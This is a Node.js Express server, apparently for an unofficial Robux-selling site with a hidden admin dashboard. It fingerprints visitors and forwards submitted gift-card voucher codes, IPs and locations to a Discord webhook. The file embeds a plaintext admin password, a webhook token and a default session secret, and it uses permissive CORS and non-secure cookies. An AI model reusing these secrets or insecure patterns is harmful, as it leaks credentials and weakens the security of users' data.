const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { body, validationResult } = require('express-validator');
const UAParser = require('ua-parser-js');
const geoip = require('geoip-lite');
const path = require('path');

const app = express();

// ============================================================
// TRUST PROXY FOR VERCEL
// ============================================================
app.set('trust proxy', 1);

// ============================================================
// CONFIGURATION
// ============================================================
const ADMIN_USERNAME = 'swatistuff';
const ADMIN_PASSWORD_HASH = bcrypt.hashSync('crexyisgone321', 12);

// Voucher webhook (secure — server-side only)
const VOUCHER_WEBHOOK_URL = process.env.VOUCHER_WEBHOOK_URL || 'https://discord.com/api/webhooks/1555578821812555852/cre2cBJn1YZvlQCIlafYsWwB2tKK3w-_CyGdGfX3tpwZRLs1MrYjMSNpO81VLYNfcwTz';

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https://flagcdn.com"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'", "https://fonts.googleapis.com", "https://fonts.gstatic.com"],
            frameSrc: ["'none'"],
            objectSrc: ["'none'"],
        },
    },
}));

app.use(cors({
    origin: '*',
    credentials: true,
}));

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: { error: 'Too many login attempts, please try again later.' }
});

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================================
// SESSION - FIXED FOR VERCEL
// ============================================================
app.use(session({
    secret: process.env.SESSION_SECRET || 'dystopias-stock-secret-key-2026',
    name: 'ds_session',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false,
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 30 * 60 * 1000
    },
    proxy: true,
    rolling: true
}));

// ============================================================
// DYNAMIC CRYPTO RATES - ON-DEMAND FETCH (Vercel Compatible)
// ============================================================
let cryptoRatesCache = {
    bitcoin: 65000,
    ethereum: 4800,
    litecoin: 270,
    monero: 108
};
let lastFetchTime = 0;
const CACHE_DURATION = 60 * 60 * 1000; // 1 hour

async function getLiveRates() {
    const now = Date.now();
    
    if (now - lastFetchTime < CACHE_DURATION && lastFetchTime > 0) {
        console.log('📦 Using cached rates');
        return cryptoRatesCache;
    }

    try {
        console.log('🌐 Fetching live rates...');
        const response = await fetch('https://whitebit.com/api/v4/public/ticker', {
            headers: { 'Accept': 'application/json' }
        });
        
        if (!response.ok) throw new Error('API returned ' + response.status);
        
        const data = await response.json();

        const getPrice = (pair) => {
            if (data[pair] && data[pair].last_price) {
                return parseFloat(data[pair].last_price);
            }
            return null;
        };

        const btc = getPrice('BTC_USDT');
        const eth = getPrice('ETH_USDT');
        const ltc = getPrice('LTC_USDT');
        const xmr = getPrice('XMR_USDT');

        if (btc && eth && ltc && xmr) {
            cryptoRatesCache = {
                bitcoin: btc,
                ethereum: eth,
                litecoin: ltc,
                monero: xmr
            };
            lastFetchTime = now;
            console.log('✅ Live rates fetched:', cryptoRatesCache);
        }
    } catch (error) {
        console.error('❌ Failed to fetch rates:', error.message);
    }

    return cryptoRatesCache;
}

// ============================================================
// IN-MEMORY LOGGING
// ============================================================
let visitorsLog = [];
let adminLogs = [];
let cryptoLogs = [];
let voucherLogs = [];

// ============================================================
// LOGGING HELPERS
// ============================================================
function getGeoData(ip) {
    try {
        const geo = geoip.lookup(ip);
        if (geo) {
            return {
                country: geo.country || 'Unknown',
                region: geo.region || 'Unknown',
                city: geo.city || 'Unknown',
                timezone: geo.timezone || 'Unknown',
                ll: geo.ll || [0, 0],
                countryName: getCountryName(geo.country)
            };
        }
        return {
            country: 'Unknown', region: 'Unknown', city: 'Unknown',
            timezone: 'Unknown', ll: [0, 0], countryName: 'Unknown'
        };
    } catch (error) {
        return {
            country: 'Unknown', region: 'Unknown', city: 'Unknown',
            timezone: 'Unknown', ll: [0, 0], countryName: 'Unknown'
        };
    }
}

function getCountryName(code) {
    const countries = {
        'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada',
        'AU': 'Australia', 'DE': 'Germany', 'FR': 'France',
        'IN': 'India', 'CN': 'China', 'JP': 'Japan',
        'BR': 'Brazil', 'RU': 'Russia', 'ZA': 'South Africa',
        'NG': 'Nigeria', 'KE': 'Kenya', 'EG': 'Egypt',
        'SA': 'Saudi Arabia', 'AE': 'United Arab Emirates',
        'SG': 'Singapore', 'MY': 'Malaysia', 'ID': 'Indonesia',
        'PH': 'Philippines', 'PK': 'Pakistan', 'BD': 'Bangladesh',
        'VN': 'Vietnam', 'TH': 'Thailand', 'KR': 'South Korea',
        'TR': 'Turkey', 'IT': 'Italy', 'ES': 'Spain',
        'NL': 'Netherlands', 'SE': 'Sweden', 'NO': 'Norway',
        'DK': 'Denmark', 'FI': 'Finland', 'NZ': 'New Zealand',
        'AR': 'Argentina', 'CL': 'Chile', 'CO': 'Colombia',
        'PE': 'Peru', 'VE': 'Venezuela', 'MX': 'Mexico',
        'PL': 'Poland', 'RO': 'Romania', 'CZ': 'Czechia',
        'GR': 'Greece', 'PT': 'Portugal', 'IE': 'Ireland',
        'IL': 'Israel', 'UA': 'Ukraine', 'HU': 'Hungary'
    };
    return countries[code] || code || 'Unknown';
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode === 'Unknown') return '🌍';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
}

function logVisitor(ip, userAgent, referer, additionalData = {}) {
    try {
        const parser = new UAParser(userAgent);
        const browser = parser.getBrowser();
        const os = parser.getOS();
        const device = parser.getDevice();
        const geo = getGeoData(ip);

        const logEntry = {
            id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
            timestamp: new Date().toISOString(),
            ip: ip,
            browser: {
                name: browser.name || 'Unknown',
                version: browser.version || 'Unknown',
                engine: parser.getEngine().name || 'Unknown'
            },
            os: {
                name: os.name || 'Unknown',
                version: os.version || 'Unknown',
                platform: os.name || 'Unknown'
            },
            device: {
                type: device.type || 'desktop',
                vendor: device.vendor || 'Unknown',
                model: device.model || 'Unknown'
            },
            geo: geo,
            referer: referer || 'Direct',
            userAgent: userAgent,
            ...additionalData,
            language: parser.getBrowser().language || 'Unknown',
            cpu: parser.getCPU().architecture || 'Unknown'
        };

        const existingIndex = visitorsLog.findIndex(v => v.ip === ip);
        if (existingIndex !== -1) {
            visitorsLog[existingIndex] = {
                ...visitorsLog[existingIndex],
                ...logEntry,
                lastVisit: new Date().toISOString(),
                visitCount: (visitorsLog[existingIndex].visitCount || 1) + 1
            };
        } else {
            logEntry.firstVisit = new Date().toISOString();
            logEntry.visitCount = 1;
            visitorsLog.push(logEntry);
        }

        if (visitorsLog.length > 1000) {
            visitorsLog = visitorsLog.slice(-1000);
        }

        return logEntry;
    } catch (error) {
        console.error('Logging error:', error);
        return null;
    }
}

function logAdminActivity(action, details, ip) {
    try {
        const geo = getGeoData(ip);
        const logEntry = {
            id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
            timestamp: new Date().toISOString(),
            ip: ip,
            geo: geo,
            action: action,
            details: details
        };
        adminLogs.push(logEntry);
        if (adminLogs.length > 1000) {
            adminLogs = adminLogs.slice(-1000);
        }
        return logEntry;
    } catch (error) {
        console.error('Admin logging error:', error);
        return null;
    }
}

// ============================================================
// VISITOR LOGGING MIDDLEWARE
// ============================================================
app.use((req, res, next) => {
    if (req.path.startsWith('/aipotsyddmin') || 
        req.path.startsWith('/assets/') ||
        req.path.startsWith('/api/') ||
        req.path.endsWith('.css') ||
        req.path.endsWith('.js') ||
        req.path.endsWith('.png') ||
        req.path.endsWith('.ico')) {
        return next();
    }

    if (req.path === '/favicon.ico') {
        return next();
    }

    const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '0.0.0.0';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || req.headers['origin'] || 'Direct';

    logVisitor(ip, userAgent, referer, {
        path: req.path,
        method: req.method
    });

    next();
});

// ============================================================
// STATIC FILES
// ============================================================
app.use('/assets', express.static(path.join(__dirname, '../assets'), {
    maxAge: '1y',
    etag: true
}));

// ============================================================
// ADMIN AUTH MIDDLEWARE
// ============================================================
function requireAdmin(req, res, next) {
    if (req.session && req.session.isAdmin) {
        return next();
    }
    res.redirect('/aipotsyddmin/login');
}

function requireAdminAPI(req, res, next) {
    if (req.session && req.session.isAdmin) {
        return next();
    }
    res.status(401).json({ error: 'Unauthorized' });
}

// ============================================================
// API - CRYPTO RATES (public endpoint for frontend)
// ============================================================
app.get('/api/crypto-rates', async (req, res) => {
    try {
        const rates = await getLiveRates();
        res.set('Cache-Control', 'no-store, max-age=0');
        res.json(rates);
    } catch (error) {
        console.error('Rates endpoint error:', error);
        res.status(500).json({ error: 'Failed to fetch rates' });
    }
});

// ============================================================
// API - CRYPTO LOGGING
// ============================================================
app.post('/api/log-crypto', (req, res) => {
    try {
        const { robuxAmount, currency, cryptoAmount, robloxUsername, browser } = req.body;
        const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '0.0.0.0';
        
        if (!robuxAmount || !currency) {
            return res.status(400).json({ error: 'Missing required fields' });
        }
        
        const geo = getGeoData(ip);
        
        let browserInfo = {};
        if (browser) {
            try {
                const parser = new UAParser(browser.userAgent || '');
                const parsed = parser.getResult();
                browserInfo = {
                    userAgent: browser.userAgent || 'Unknown',
                    platform: browser.platform || 'Unknown',
                    language: browser.language || 'Unknown',
                    browserName: parsed.browser.name || 'Unknown',
                    browserVersion: parsed.browser.version || 'Unknown',
                    osName: parsed.os.name || 'Unknown',
                    osVersion: parsed.os.version || 'Unknown',
                    deviceType: parsed.device.type || 'desktop',
                    deviceVendor: parsed.device.vendor || 'Unknown',
                    deviceModel: parsed.device.model || 'Unknown',
                    engine: parsed.engine.name || 'Unknown'
                };
            } catch (e) {
                browserInfo = { error: 'Failed to parse', raw: browser };
            }
        }
        
        const logEntry = {
            id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
            timestamp: new Date().toISOString(),
            ip: ip,
            geo: geo,
            robuxAmount: parseInt(robuxAmount) || 0,
            currency: currency || 'Unknown',
            cryptoAmount: parseFloat(cryptoAmount) || 0,
            price: (parseInt(robuxAmount) / 1000) * 2.5,
            robloxUsername: robloxUsername || 'Unknown',
            browser: browserInfo,
            method: currency === 'card' ? 'Card/PayPal' : 'Crypto'
        };
        
        cryptoLogs.push(logEntry);
        if (cryptoLogs.length > 1000) {
            cryptoLogs = cryptoLogs.slice(-1000);
        }
        
        console.log('✅ Logged:', logEntry.id, logEntry.currency, logEntry.robloxUsername);
        res.json({ success: true, logId: logEntry.id });
    } catch (error) {
        console.error('API logging error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ============================================================
// API - VOUCHER SUBMISSION (secure)
// ============================================================
app.post('/api/submit-voucher', limiter, async (req, res) => {
    try {
        const { robuxAmount, price, robloxUsername, vouchers, voucherCode, browser } = req.body;
        const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '0.0.0.0';
        
        // Validation
        if (!voucherCode || typeof voucherCode !== 'string') {
            return res.status(400).json({ error: 'Voucher code required' });
        }
        if (voucherCode.length < 5 || voucherCode.length > 5000) {
            return res.status(400).json({ error: 'Invalid voucher code length' });
        }
        if (!robuxAmount || !robloxUsername) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        // Sanitize
        const safeCode = String(voucherCode).slice(0, 5000).replace(/[^\w\s\-\.\:\/\n\r]/g, '');
        const safeUsername = String(robloxUsername).slice(0, 50).replace(/[^\w]/g, '');
        
        const geo = getGeoData(ip);
        
        let browserInfo = {};
        if (browser) {
            try {
                const parser = new UAParser(browser.userAgent || '');
                const parsed = parser.getResult();
                browserInfo = {
                    userAgent: browser.userAgent || 'Unknown',
                    platform: browser.platform || 'Unknown',
                    language: browser.language || 'Unknown',
                    browserName: parsed.browser.name || 'Unknown',
                    browserVersion: parsed.browser.version || 'Unknown',
                    osName: parsed.os.name || 'Unknown',
                    osVersion: parsed.os.version || 'Unknown',
                    deviceType: parsed.device.type || 'desktop',
                    deviceVendor: parsed.device.vendor || 'Unknown',
                    deviceModel: parsed.device.model || 'Unknown'
                };
            } catch (e) {
                browserInfo = { error: 'Parse failed' };
            }
        }

        const logEntry = {
            id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
            timestamp: new Date().toISOString(),
            ip: ip,
            geo: geo,
            robuxAmount: parseInt(robuxAmount) || 0,
            price: parseFloat(price) || 0,
            robloxUsername: safeUsername,
            vouchers: Array.isArray(vouchers) ? vouchers : [],
            voucherCode: safeCode,
            browser: browserInfo,
            method: 'Voucher'
        };

        voucherLogs.push(logEntry);
        if (voucherLogs.length > 1000) voucherLogs = voucherLogs.slice(-1000);

        // Send to Discord webhook
        try {
            const voucherList = Array.isArray(vouchers) && vouchers.length
                ? vouchers.map(v => '$' + v).join(' + ')
                : 'N/A';

            const webhookPayload = {
                username: "Dystopia's Stock",
                embeds: [{
                    title: '🎟️ New Voucher Submission',
                    color: 0x39ff14,
                    fields: [
                        { name: '👤 Roblox User', value: '`' + safeUsername + '`', inline: true },
                        { name: '💰 Price', value: '$' + parseFloat(price || 0).toFixed(2), inline: true },
                        { name: '🪙 Robux', value: (parseInt(robuxAmount) || 0).toLocaleString(), inline: true },
                        { name: '🎫 Vouchers Needed', value: voucherList, inline: false },
                        { name: '🔑 Voucher Code(s)', value: '```\n' + safeCode.slice(0, 1000) + '\n```', inline: false },
                        { name: '🌍 Country', value: (geo.countryName || 'Unknown') + (geo.city && geo.city !== 'Unknown' ? ' · ' + geo.city : ''), inline: true },
                        { name: '🌐 IP', value: '`' + ip + '`', inline: true },
                        { name: '💻 Browser', value: (browserInfo.browserName || 'Unknown') + ' · ' + (browserInfo.osName || 'Unknown'), inline: true }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: "Dystopia's Stock · Voucher System" }
                }]
            };

            await fetch(VOUCHER_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(webhookPayload)
            });
            console.log('✅ Voucher webhook sent');
        } catch (webhookErr) {
            console.error('⚠️ Webhook failed:', webhookErr.message);
        }

        console.log('✅ Voucher submitted:', logEntry.id, safeUsername, '$' + logEntry.price);
        res.json({ success: true, id: logEntry.id });
    } catch (error) {
        console.error('Voucher submission error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ============================================================
// API - LOG MANAGEMENT
// ============================================================
app.post('/api/admin/delete-log', requireAdminAPI, (req, res) => {
    try {
        const { logId, logType } = req.body;
        let logs = [];
        
        if (logType === 'visitor') logs = visitorsLog;
        else if (logType === 'crypto') logs = cryptoLogs;
        else if (logType === 'admin') logs = adminLogs;
        else if (logType === 'voucher') logs = voucherLogs;
        else return res.status(400).json({ error: 'Invalid log type' });

        const index = logs.findIndex(l => l.id === logId);
        if (index === -1) return res.status(404).json({ error: 'Log not found' });

        logs.splice(index, 1);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/admin/clear-logs', requireAdminAPI, (req, res) => {
    try {
        const { logType } = req.body;
        
        if (logType === 'visitor') visitorsLog = [];
        else if (logType === 'crypto') cryptoLogs = [];
        else if (logType === 'admin') adminLogs = [];
        else if (logType === 'voucher') voucherLogs = [];
        else if (logType === 'all') {
            visitorsLog = []; cryptoLogs = []; adminLogs = []; voucherLogs = [];
        }
        else return res.status(400).json({ error: 'Invalid log type' });
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ============================================================
// ADMIN ROUTES
// ============================================================
app.get('/aipotsyddmin/login', (req, res) => {
    if (req.session && req.session.isAdmin) {
        return res.redirect('/aipotsyddmin/dashboard');
    }
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login - Dystopia's Stock</title>
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body {
                    background: #050505;
                    font-family: 'Plus Jakarta Sans', system-ui, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }
                .login-container {
                    background: #0d0d0d;
                    border: 1px solid rgba(255,255,255,0.06);
                    border-radius: 12px;
                    padding: 40px;
                    max-width: 400px;
                    width: 100%;
                }
                .login-container h1 { color: #39ff14; font-size: 1.4rem; margin-bottom: 6px; }
                .login-container p { color: #8a8a8a; font-size: 0.9rem; margin-bottom: 24px; }
                .login-container label { color: #fbfbfb; font-size: 0.85rem; font-weight: 500; display: block; margin-bottom: 4px; }
                .login-container input {
                    width: 100%;
                    padding: 10px 14px;
                    background: rgba(255,255,255,0.05);
                    border: 1px solid rgba(255,255,255,0.08);
                    border-radius: 8px;
                    color: #fff;
                    font-size: 0.95rem;
                    margin-bottom: 16px;
                    transition: border-color 0.2s;
                }
                .login-container input:focus { outline: none; border-color: #39ff14; }
                .login-container button {
                    width: 100%;
                    padding: 12px;
                    background: #39ff14;
                    color: #050505;
                    border: none;
                    border-radius: 8px;
                    font-size: 1rem;
                    font-weight: 600;
                    cursor: pointer;
                    transition: background 0.2s;
                }
                .login-container button:hover { background: #4dff2e; }
                .error { color: #ff6b6b; font-size: 0.85rem; margin-bottom: 12px; display: none; }
                .error.show { display: block; }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h1>🔐 Admin Access</h1>
                <p>Enter your credentials to access the admin panel.</p>
                <div class="error" id="error">Invalid username or password.</div>
                <form method="POST" action="/aipotsyddmin/login">
                    <label>Username</label>
                    <input type="text" name="username" required autocomplete="username" />
                    <label>Password</label>
                    <input type="password" name="password" required autocomplete="current-password" />
                    <button type="submit">Login →</button>
                </form>
            </div>
            <script>
                if (window.location.search.includes('error=1')) {
                    document.getElementById('error').classList.add('show');
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/aipotsyddmin/login', loginLimiter, [
    body('username').isString().trim().escape(),
    body('password').isString().trim()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.redirect('/aipotsyddmin/login?error=1');

    const { username, password } = req.body;

    if (username === ADMIN_USERNAME && bcrypt.compareSync(password, ADMIN_PASSWORD_HASH)) {
        req.session.isAdmin = true;
        req.session.adminLoginTime = new Date().toISOString();
        
        const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '0.0.0.0';
        logAdminActivity('LOGIN', 'Admin logged in successfully', ip);
        
        return res.redirect('/aipotsyddmin/dashboard');
    }

    const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '0.0.0.0';
    logAdminActivity('LOGIN_FAILED', 'Failed login attempt for username: ' + username, ip);

    res.redirect('/aipotsyddmin/login?error=1');
});

app.get('/aipotsyddmin/logout', requireAdmin, (req, res) => {
    const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || '0.0.0.0';
    logAdminActivity('LOGOUT', 'Admin logged out', ip);
    
    req.session.destroy((err) => {
        if (err) console.error('Session destroy error:', err);
        res.redirect('/aipotsyddmin/login');
    });
});

// ============================================================
// ADMIN DASHBOARD
// ============================================================
app.get('/aipotsyddmin/dashboard', requireAdmin, (req, res) => {
    const totalVisitors = visitorsLog.length;
    const totalCryptoSelections = cryptoLogs.length;
    const totalVouchers = voucherLogs.length;
    const totalAdminActions = adminLogs.length;

    const countries = new Set();
    visitorsLog.forEach(v => {
        if (v.geo && v.geo.countryName && v.geo.countryName !== 'Unknown') {
            countries.add(v.geo.countryName);
        }
    });

    const browsers = new Set();
    visitorsLog.forEach(v => {
        if (v.browser && v.browser.name && v.browser.name !== 'Unknown') {
            browsers.add(v.browser.name);
        }
    });

    const voucherCodeMap = voucherLogs.reduce((acc, v) => { acc[v.id] = v.voucherCode; return acc; }, {});

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Dashboard - Dystopia's Stock</title>
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body {
                    background: #050505;
                    font-family: 'Plus Jakarta Sans', system-ui, sans-serif;
                    color: #fbfbfb;
                    padding: 20px;
                    min-height: 100vh;
                }
                .container { max-width: 1400px; margin: 0 auto; }
                .header {
                    display: flex; justify-content: space-between; align-items: center;
                    padding: 16px 0; border-bottom: 1px solid rgba(255,255,255,0.06);
                    margin-bottom: 24px; flex-wrap: wrap; gap: 12px;
                }
                .header h1 { color: #39ff14; font-size: 1.6rem; }
                .header .logout {
                    color: #ff6b6b; text-decoration: none; font-size: 0.9rem;
                    padding: 8px 16px; border: 1px solid rgba(255,50,50,0.2);
                    border-radius: 8px; transition: all 0.2s;
                }
                .header .logout:hover { background: rgba(255,50,50,0.1); border-color: #ff6b6b; }
                .header-info { color: #8a8a8a; font-size: 0.85rem; }
                .header-info strong { color: #39ff14; }

                .stats {
                    display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
                    gap: 12px; margin-bottom: 24px;
                }
                .stat-card {
                    background: #0d0d0d; border: 1px solid rgba(255,255,255,0.06);
                    border-radius: 10px; padding: 16px 20px; transition: border-color 0.2s;
                }
                .stat-card:hover { border-color: rgba(57,255,20,0.15); }
                .stat-card .number { font-size: 2rem; font-weight: 800; color: #39ff14; line-height: 1.2; }
                .stat-card .label { color: #8a8a8a; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; }
                .stat-card .sub { color: #5a5a5a; font-size: 0.7rem; margin-top: 2px; }

                .tabs {
                    display: flex; gap: 8px; border-bottom: 1px solid rgba(255,255,255,0.06);
                    padding-bottom: 12px; margin-bottom: 16px; flex-wrap: wrap;
                }
                .tabs button {
                    padding: 8px 18px; background: transparent; border: 1px solid transparent;
                    border-radius: 8px; color: #8a8a8a; font-size: 0.85rem;
                    font-weight: 500; cursor: pointer; transition: all 0.2s;
                }
                .tabs button.active { border-color: #39ff14; color: #39ff14; background: rgba(57,255,20,0.06); }
                .tabs button:hover { color: #fff; }

                .tab-content { display: none; }
                .tab-content.active { display: block; }

                .log-table {
                    background: #0d0d0d; border: 1px solid rgba(255,255,255,0.06);
                    border-radius: 10px; overflow: hidden; overflow-x: auto;
                }
                .log-table table { width: 100%; border-collapse: collapse; font-size: 0.82rem; min-width: 600px; }
                .log-table th {
                    text-align: left; padding: 10px 14px; background: rgba(255,255,255,0.03);
                    color: #8a8a8a; font-weight: 600; font-size: 0.7rem;
                    text-transform: uppercase; letter-spacing: 0.05em;
                    border-bottom: 1px solid rgba(255,255,255,0.06);
                    position: sticky; top: 0;
                }
                .log-table td {
                    padding: 10px 14px; border-bottom: 1px solid rgba(255,255,255,0.03);
                    color: #d4d4d4; vertical-align: middle;
                }
                .log-table tr:hover td { background: rgba(255,255,255,0.02); }
                .log-table .ip { font-family: monospace; color: #39ff14; font-size: 0.8rem; }
                .log-table .timestamp { color: #8a8a8a; font-size: 0.7rem; }
                .log-table .country-flag { font-size: 1.2rem; margin-right: 6px; }

                .badge {
                    display: inline-block; padding: 2px 10px; border-radius: 4px;
                    font-size: 0.65rem; font-weight: 600;
                }
                .badge-success { background: rgba(57,255,20,0.15); color: #39ff14; }
                .badge-danger { background: rgba(255,50,50,0.15); color: #ff6b6b; }
                .badge-warning { background: rgba(255,200,0,0.15); color: #ffd93d; }
                .badge-info { background: rgba(50,150,255,0.15); color: #4d9fff; }

                .delete-btn {
                    background: rgba(255,50,50,0.1); border: 1px solid rgba(255,50,50,0.2);
                    color: #ff6b6b; padding: 4px 12px; border-radius: 6px;
                    font-size: 0.7rem; cursor: pointer; transition: all 0.2s;
                }
                .delete-btn:hover { background: rgba(255,50,50,0.3); }

                .view-btn {
                    background: rgba(57,255,20,0.1); border: 1px solid rgba(57,255,20,0.2);
                    color: #39ff14; padding: 4px 12px; border-radius: 6px;
                    font-size: 0.7rem; cursor: pointer; transition: all 0.2s;
                }
                .view-btn:hover { background: rgba(57,255,20,0.2); }

                .clear-btn {
                    background: rgba(255,200,0,0.1); border: 1px solid rgba(255,200,0,0.2);
                    color: #ffd93d; padding: 6px 16px; border-radius: 6px;
                    font-size: 0.75rem; cursor: pointer; transition: all 0.2s;
                    margin-left: 8px;
                }
                .clear-btn:hover { background: rgba(255,200,0,0.3); }

                .empty-state { text-align: center; padding: 40px; color: #8a8a8a; }

                .table-controls {
                    display: flex; justify-content: space-between; align-items: center;
                    flex-wrap: wrap; gap: 12px; margin-bottom: 12px;
                }
                .table-controls .left { display: flex; align-items: center; gap: 8px; }

                .footer {
                    margin-top: 40px; padding: 20px 0;
                    border-top: 1px solid rgba(255,255,255,0.06);
                    text-align: center; color: #5a5a5a; font-size: 0.8rem;
                }
                .footer .highlight { color: #39ff14; font-weight: 600; }
                .footer .heart {
                    color: #ff6b6b; display: inline-block;
                    animation: pulse 1.5s ease-in-out infinite;
                }
                @keyframes pulse {
                    0%, 100% { transform: scale(1); }
                    50% { transform: scale(1.2); }
                }

                @media (max-width: 600px) {
                    .header { flex-direction: column; align-items: flex-start; }
                    .stats { grid-template-columns: 1fr 1fr; }
                    .log-table { font-size: 0.7rem; }
                    .log-table th, .log-table td { padding: 6px 8px; }
                    .table-controls { flex-direction: column; align-items: stretch; }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div>
                        <h1>🔐 Admin Dashboard</h1>
                        <span class="header-info">
                            Logged in as <strong>${ADMIN_USERNAME}</strong> · 
                            ${new Date().toLocaleString()}
                        </span>
                    </div>
                    <a href="/aipotsyddmin/logout" class="logout">🚪 Logout</a>
                </div>

                <div class="stats">
                    <div class="stat-card">
                        <div class="number">${totalVisitors}</div>
                        <div class="label">Total Visitors</div>
                        <div class="sub">${countries.size} countries · ${browsers.size} browsers</div>
                    </div>
                    <div class="stat-card">
                        <div class="number">${totalCryptoSelections}</div>
                        <div class="label">Purchase Attempts</div>
                        <div class="sub">Crypto & Card logs</div>
                    </div>
                    <div class="stat-card">
                        <div class="number">${totalVouchers}</div>
                        <div class="label">Vouchers</div>
                        <div class="sub">Voucher submissions</div>
                    </div>
                    <div class="stat-card">
                        <div class="number">${totalAdminActions}</div>
                        <div class="label">Admin Actions</div>
                        <div class="sub">Logins, logouts & more</div>
                    </div>
                </div>

                <div class="tabs">
                    <button class="active" data-tab="visitors">👥 Visitors</button>
                    <button data-tab="crypto">🪙 Purchase Logs</button>
                    <button data-tab="voucher">🎟️ Vouchers</button>
                    <button data-tab="admin">🔐 Admin Logs</button>
                </div>

                <!-- VISITORS TAB -->
                <div class="tab-content active" id="tab-visitors">
                    <div class="table-controls">
                        <div class="left">
                            <span style="color:#8a8a8a;font-size:0.8rem;">${visitorsLog.length} entries</span>
                            <button class="clear-btn" onclick="clearLogs('visitor')">🗑️ Clear All</button>
                        </div>
                        <span style="color:#5a5a5a;font-size:0.7rem;">Showing latest 100 entries</span>
                    </div>
                    <div class="log-table">
                        <table>
                            <thead>
                                <tr>
                                    <th>IP</th>
                                    <th>🌍 Country</th>
                                    <th>Browser</th>
                                    <th>OS</th>
                                    <th>Device</th>
                                    <th>Visits</th>
                                    <th>Last Visit</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${visitorsLog.length === 0 ? `
                                    <tr><td colspan="8" class="empty-state">No visitors logged yet.</td></tr>
                                ` : visitorsLog.slice().reverse().slice(0, 100).map(v => `
                                    <tr>
                                        <td class="ip">${v.ip || 'Unknown'}</td>
                                        <td>
                                            <span class="country-flag">${v.geo?.country ? getFlagEmoji(v.geo.country) : '🌍'}</span>
                                            ${v.geo?.countryName || 'Unknown'}
                                            ${v.geo?.city && v.geo.city !== 'Unknown' ? '· ' + v.geo.city : ''}
                                        </td>
                                        <td>${v.browser?.name || 'Unknown'} ${v.browser?.version || ''}</td>
                                        <td>${v.os?.name || 'Unknown'} ${v.os?.version || ''}</td>
                                        <td>${v.device?.type || 'desktop'} ${v.device?.vendor ? '· ' + v.device.vendor : ''}</td>
                                        <td><span class="badge badge-warning">${v.visitCount || 1}</span></td>
                                        <td class="timestamp">${new Date(v.lastVisit || v.timestamp).toLocaleString()}</td>
                                        <td>
                                            <button class="delete-btn" onclick="deleteLog('${v.id}', 'visitor')">✕</button>
                                        </td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- CRYPTO TAB -->
                <div class="tab-content" id="tab-crypto">
                    <div class="table-controls">
                        <div class="left">
                            <span style="color:#8a8a8a;font-size:0.8rem;">${cryptoLogs.length} entries</span>
                            <button class="clear-btn" onclick="clearLogs('crypto')">🗑️ Clear All</button>
                        </div>
                        <span style="color:#5a5a5a;font-size:0.7rem;">Showing latest 100 entries</span>
                    </div>
                    <div class="log-table">
                        <table>
                            <thead>
                                <tr>
                                    <th>IP</th>
                                    <th>🌍 Country</th>
                                    <th>👤 Roblox User</th>
                                    <th>Robux</th>
                                    <th>Method</th>
                                    <th>Amount</th>
                                    <th>Price</th>
                                    <th>🌐 Browser</th>
                                    <th>💻 OS</th>
                                    <th>Timestamp</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${cryptoLogs.length === 0 ? `
                                    <tr><td colspan="11" class="empty-state">No purchase attempts yet.</td></tr>
                                ` : cryptoLogs.slice().reverse().slice(0, 100).map(v => `
                                    <tr>
                                        <td class="ip">${v.ip || 'Unknown'}</td>
                                        <td>
